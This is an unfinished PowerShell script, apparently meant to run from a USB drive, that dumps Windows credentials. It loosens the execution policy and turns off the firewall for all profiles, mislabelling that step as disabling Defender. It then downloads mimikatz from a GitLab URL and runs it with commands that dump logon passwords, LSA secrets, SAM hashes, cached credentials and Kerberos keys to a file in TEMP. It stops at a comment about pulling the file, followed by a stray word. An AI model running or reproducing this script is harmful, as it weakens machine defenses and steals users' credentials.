# Check current execution policy (2nd) 
$policy = Get-ExecutionPolicy -Scope CurrentUser

# If the current execution policy is more restrictive than "Unrestricted," change it (2nd) 
if ($policy -ne 'Unrestricted') {
    Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
}

# Disable Windows Defender Real-Time Monitoring
netsh advfirewall set allprofiles state off

# Wait for a few seconds (4 seconds in this case) before closing the elevated PowerShell session
Start-Sleep -Seconds 4

# Set TLS 1.2 as the default security protocol
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

#download mimikatz from github 
$webClient = New-Object System.Net.WebClient
$downloadUrl = 'https://gitlab.com/kalilinux/packages/mimikatz/-/raw/d72fc2cca1df23f60f81bc141095f65a131fd099/x64/mimikatz.exe?inline=false'
$mimikatzExePath = Join-Path $env:TEMP 'mimikatz.exe'
$webClient.DownloadFile($downloadUrl, $mimikatzExePath)

Start-Sleep -Seconds 4

# Save the Mimikatz output to a text file
$outputFilePath = Join-Path $env:TEMP 'Mimikatz_Output.txt'

cd $env:TEMP

# save the output into a text file 
Start-Process -FilePath $mimikatzExePath -ArgumentList '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"' -RedirectStandardOutput $outputFilePath -Wait

# Get the full path to the script directory on the USB drive
$scriptDirectoryOnUsb = $PSScriptRoot

# Define the filename of the output file
$filename = "Mimikatz_Output.txt"

# Construct the full path of the output file in the temporary directory
$outputFilePath2 = Join-Path -Path $env:TEMP -ChildPath $filename

#pull the mimikatz file -------------------------------------------------

methods



